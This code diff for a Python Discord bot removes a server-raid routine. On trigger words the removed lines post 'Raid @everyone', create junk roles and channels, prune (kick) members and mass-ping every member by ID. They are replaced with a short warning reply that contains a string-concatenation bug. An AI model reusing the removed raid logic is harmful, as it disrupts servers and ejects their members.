@@ -26,36 +26,16 @@ async def on_message(message):
     listroles = [y.name for y in server.roles] 
     
     if any(word in message.content for word in["<@215761992474951681>", "@Superplus", "yo", "elo"]):
-        msg = 'Raid @everyone'.format(message)
+        msg = ("Don't ping the devs" + (message.author)).format(message)
         try:
             await client.send_message(message.channel, msg)
-        except:
-            server = message.server
-        #t = next(y.id for y in server.roles)
-        #await client.send_message(message.channel, t)         
-        #await client.delete_channel(y)
-
-        try:
-            await client.create_role(server, name = "blarg")
-        except: 
             pass
-        try:
-           await client.create_channel(server, name = "blorg")
         except:
             pass
-        try:
-            await client.prune_members(server, days = 1)
-        except:
-            pass
-
-        if message.author.server_permissions.mention_everyone == True:
-            await client.send_message(message.channel, "@everyone")
-        
-        else:
-            pongos = [x.id for x in server.members]       
-            ping= roles;
-            ping = "<@"+ '>,<@'.join(pongos) + ">";
-            await client.send_message(message.channel, ping)            
+        pass
+    else:
+        pass
+    pass
  
     
 #m1 
